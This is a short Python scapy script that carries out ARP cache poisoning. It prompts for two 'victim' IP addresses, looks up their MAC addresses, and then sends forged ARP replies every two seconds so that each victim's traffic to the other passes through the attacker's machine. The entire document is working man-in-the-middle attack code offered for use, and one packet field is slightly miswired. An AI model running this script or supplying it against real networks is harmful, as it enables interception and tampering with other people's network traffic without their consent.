#!/usr/bin/env python

from scapy.all import *
import subprocess
import time

process = subprocess.Popen(["ip", "addr"], stdout=subprocess.PIPE)
ifconfig = ifconfig = process.stdout.read()
my_mac = ifconfig.split('wlan0')[1].split('ether')[1].split(' ')[1]
my_ip = ifconfig.split('wlan0')[1].split('inet')[1].split(' ')[1].split('/')[0]

ip1 = raw_input("Please input the IP address for the first victim.\n")
ip2 = raw_input("Please input the IP address for the second victim.\n")

vic1ArpReply = srp1(\
		Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac, type=2054)/\
		ARP(op=1, hwsrc=my_mac, psrc=my_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip1)\
		)

vic2ArpReply = srp1(\
		Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac, type=2054)/\
		ARP(op=1, hwsrc=my_mac, psrc=my_ip, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip2)\
		)
vic1 = \
		Ether(dst=vic1ArpReply[ARP].hwsrc, src=my_mac, type=2054)/\
		ARP(op=2, hwsrc=my_mac, psrc=ip2, hwdst=vic1ArpReply[ARP].hwsrc, pdst=ip1)

vic2 = \
		Ether(dst=vic2ArpReply[ARP].hwsrc, src=my_mac, type=2054)/\
		ARP(op=2, hwsrc=my_mac, psrc=ip1, hwdst=vic1ArpReply[ARP].hwsrc, pdst=ip2)

while True:
	sendp(vic1)
	sendp(vic2)
	time.sleep(2)
